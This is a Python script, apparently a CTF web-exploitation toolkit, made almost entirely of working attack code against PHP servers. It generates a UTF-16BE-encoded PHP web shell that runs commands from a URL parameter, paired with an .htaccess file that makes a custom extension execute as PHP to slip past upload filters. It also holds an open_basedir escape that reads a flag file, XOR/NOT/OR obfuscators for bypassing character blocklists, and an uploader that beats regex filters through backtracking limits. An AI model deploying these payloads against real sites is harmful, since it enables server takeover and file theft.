import re
import requests
from io import BytesIO


class BPS_utf16be:
    SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"
    php1 = "<?php eval($_GET['cmd']); die(); ?>"
    php2 = '''
    <?php
        ini_set("open_basedir","/tmp/:/var/www/html/");
        mkdir("sub");
        chdir("sub");
        ini_set("open_basedir","..");
        chdir("..");
        chdir("..");
        chdir("..");
        chdir("..");
        chdir("..");        
        ini_set("open_basedir","/");
        var_dump(file_get_contents("/THis_Is_tHe_F14g"));
    ?>
    '''

    @staticmethod
    def generate_php_file(filename, script=''):
        phpfile = open(filename, 'wb')
        phpfile.write(script.encode('utf-16be'))
        phpfile.write(BPS_utf16be.SIZE_HEADER)

        phpfile.close()

    @staticmethod
    def generate_htacess(filename='.htaccess'):
        h = open(filename, 'wb')
        h.write(BPS_utf16be.SIZE_HEADER)
        h.write(b'AddType application/x-httpd-php .lethe\n')
        h.write(b'php_value zend.multibyte 1\n')
        h.write(b'php_value zend.detect_unicode 1\n')
        h.write(b'php_value display_errors 1\n')
        h.close()

    @staticmethod
    def createfile(path='', pl=''):
        if not path.endswith('/'): path += '/'
        BPS_utf16be.generate_htacess(path + '.htaccess')
        BPS_utf16be.generate_php_file(path + 'shell.php', pl)


def urlencode(str=''):
    ret = ''
    for ix in str:
        i = '%' + ('%04x' % ord(ix))[:2]
        j = '%' + ('%04x' % ord(ix))[2:]
        if not (i == '%00'):
            ret += i
        ret += j
    return ret


def do_nothing(txt=''):
    return txt


def getStr_Xor(final_string='phpinfo', blockprage='[0-9]', flag=re.I | re.M):
    x = ''
    y = ''
    charlist = [chr(255 - i) for i in range(0, 256)]
    cc = False
    for a in final_string:
        cc = False
        for i in charlist:
            if cc: break;
            for p in charlist:
                if ord(i) ^ ord(p) == ord(a) and re.search(blockprage, i, flag) == None and not re.search(blockprage, p,
                                                                                                          flag) == None:
                    x += i
                    y += p
                    cc = True
                    break
    print(x, y)
    print(urlencode(x) + '^' + urlencode(y))
    return (urlencode(x) + '^' + urlencode(y))


def getStr_Not(pl=''):  # 用于取反的一个小函数
    out = '~'
    for i in pl:
        x = (~ord(i)) & 0xFF
        out += '%%%02x' % x
    print(out)
    return (out)


def getStr_Or(pl=''):
    b1 = '("'
    b2 = '"'
    for i in pl:
        x = ord(i)
        b1 += '%%%02x' % (x & 0x1F)
        b2 += '%%%02x' % (x & 0xE0)
    b1 += '"'
    b2 += '")'
    print(b1 + '|' + b2)
    return b1 + '|' + b2


def getStr_OR(final_string='phpinfo', blockprage='[0-9]', flag=re.I | re.M):
    x = ''
    y = ''
    charlist = [chr(255 - i) for i in range(0, 256)]
    cc = False
    for a in final_string:
        cc = False
        for i in charlist:
            if cc: break;
            for p in charlist:
                if ord(i) | ord(p) == ord(a) and re.search(blockprage, i, flag) == None and not re.search(blockprage, p,
                                                                                                          flag) == None:
                    x += i
                    y += p
                    cc = True
                    break
    print(x, y)
    print(urlencode(x) + '|' + urlencode(y))
    return (urlencode(x) + '|' + urlencode(y))


def zzhsgj(url="", pl='readfile("../../../flag_php7_2_1s_c0rrect")', fx=1000000):  # 正则回溯攻击
    files = {'file': BytesIO(('<?php ' + pl + ';//' + 'a' * fx).encode())}
    res = requests.post(url=url, files=files, allow_redirects=False)
    tr = '\n' + str(res.headers)
    tr += '\n' + ' - ' * 50 + res.text
    print(tr)
    return tr
